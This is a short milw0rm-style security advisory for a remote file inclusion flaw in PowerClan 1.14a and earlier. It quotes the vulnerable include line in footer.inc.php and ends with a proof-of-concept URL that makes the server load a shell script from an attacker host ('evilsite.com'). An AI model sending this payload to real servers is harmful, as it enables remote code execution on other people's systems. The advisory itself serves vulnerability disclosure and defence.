@@ -1,0 +1,24 @@
++-------------------------------------------------------------------------------------------
++ PowerClan <= 1.14a (footer.inc.php) Remote File Include Vulnerability
++-------------------------------------------------------------------------------------------
++ Vendor ............: http://www.powerscripts.org/
++ Affected Software .: PowerClan <= 1.14a
++ Download ..........: http://ftp.powerscripts.org/pc/powerclan114a.zip
++ Class .............: Remote File Inclusion
++ Risk ..............: High (Remote File Execution)
++ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
++-------------------------------------------------------------------------------------------
++ Details:
++ PowerClan footer.inc.php does not initialize the $settings[footer] variable before using it
++ to include files, assuming register_globals = on, we can initialize the variable in a query
++ string and include a remote file of our choice.
++
++ Vulnerable Code:
++ footer.inc.php, line(s) 24:
++ -> 24: include($settings[footer]);
++
++ Proof Of Concept:
++ http://[target]/[path]/footer.inc.php?settings[footer]=http://evilsite.com/shell.php
++-------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-12-21]
